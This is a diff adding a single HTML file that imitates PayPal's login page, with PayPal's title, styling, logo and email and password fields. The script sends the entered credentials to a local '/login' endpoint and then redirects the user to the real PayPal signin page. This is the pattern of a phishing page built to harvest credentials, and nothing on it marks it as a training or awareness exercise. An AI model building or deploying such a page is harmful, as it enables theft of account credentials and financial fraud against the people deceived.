@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to your PayPal account</title>
+    <style>
+        body {
+            font-family: PayPalSansBig-Regular, "Helvetica Neue", Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 450px;
+            border: 1px solid #eaeced;
+            border-radius: 8px;
+            padding: 50px 40px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 30px;
+        }
+        .logo img {
+            height: 36px;
+        }
+        input {
+            width: 100%;
+            padding: 18px;
+            border: 1px solid #9da3a6;
+            border-radius: 4px;
+            font-size: 18px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            color: #001435;
+        }
+        input:focus {
+            border-color: #0070ba;
+            outline: none;
+            box-shadow: 0 0 4px #0070ba;
+        }
+        .forgot {
+            color: #0070ba;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            display: block;
+            margin-bottom: 30px;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        .next-btn {
+            background-color: #0070ba;
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .next-btn:hover {
+            background-color: #003087;
+        }
+        .divider {
+            position: relative;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            border-top: 1px solid #cbd2d6;
+            z-index: -1;
+        }
+        .divider span {
+            background: #fff;
+            padding: 0 10px;
+            color: #6c7378;
+            font-size: 14px;
+        }
+        .signup-btn {
+            background-color: #fff;
+            color: #003087;
+            border: 1px solid #003087;
+            border-radius: 25px;
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            box-sizing: border-box;
+        }
+        .signup-btn:hover {
+            background-color: #f2f8fc;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #6c7378;
+            background-color: #f7f9fa;
+            width: 100%;
+            padding: 20px 0;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+        }
+        .footer a {
+            color: #6c7378;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+    </style>
+    <script>
+        async function handleLogin(event) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+            
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    window.location.href = "https://www.paypal.com/signin";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/500px-PayPal.svg.png" alt="PayPal">
+        </div>
+        
+        <form id="login-form" onsubmit="handleLogin(event)">
+            <input type="text" id="email" name="email" placeholder="Email or mobile number" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            
+            <a href="#" class="forgot">Forgot password?</a>
+            
+            <button type="submit" class="next-btn">Log In</button>
+        </form>
+        
+        <div class="divider">
+            <span>or</span>
+        </div>
+        
+        <a href="#" class="signup-btn">Sign Up</a>
+    </div>
+    
+    <div class="footer">
+        <a href="#">Contact Us</a>
+        <a href="#">Privacy</a>
+        <a href="#">Legal</a>
+        <a href="#">Worldwide</a>
+    </div>
+</body>
+</html>
